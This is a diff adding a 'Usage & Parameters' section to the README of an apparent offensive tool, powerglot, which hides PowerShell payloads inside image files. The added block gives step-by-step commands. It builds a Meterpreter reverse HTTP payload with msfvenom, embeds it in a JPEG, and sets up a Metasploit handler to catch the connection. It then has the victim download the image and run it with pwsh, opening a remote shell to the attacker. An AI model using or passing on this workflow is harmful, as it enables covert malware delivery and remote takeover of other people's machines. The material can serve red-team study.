@@ -21,6 +21,24 @@ We works in several formats: JPEG, PNG, GIF, BMP, ZIP, PDF, MP3, etc.
 
 # Usage & Parameters
 
+```
+# SERVER
+# Prepare the payload and configure the server to receive a meterpreter connection
+
+# msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out meterpreter.ps1 LHOST=<IP> LPORT=<PORT>
+# python3 powerglot.py -o meterpreter.ps1 cat.jpg cat-o.jpg
+# Check correct JPEG format
+  #file cat-o.jpg
+  # feh cat-o.jpg
+
+msf > use exploit/multi/handler msf exploit(multi/handler) > set payload windows/meterpreter_reverse_http payload => windows/meterpreter_reverse_http msf exploit(multi/handler) > set lhost <IP> lhost => <IP> msf exploit(multi/handler) > set lport <PORT> lport => <PORT> msf exploit(multi/handler) > exploit
+
+# LINUX VICTIM
+# Download cat-o.jpg
+# Execute 
+# pwsh cat-o.jpg or cat cat-o.jpg | pwsd
+```
+
 # Future work. Doing
 
 # Author & license
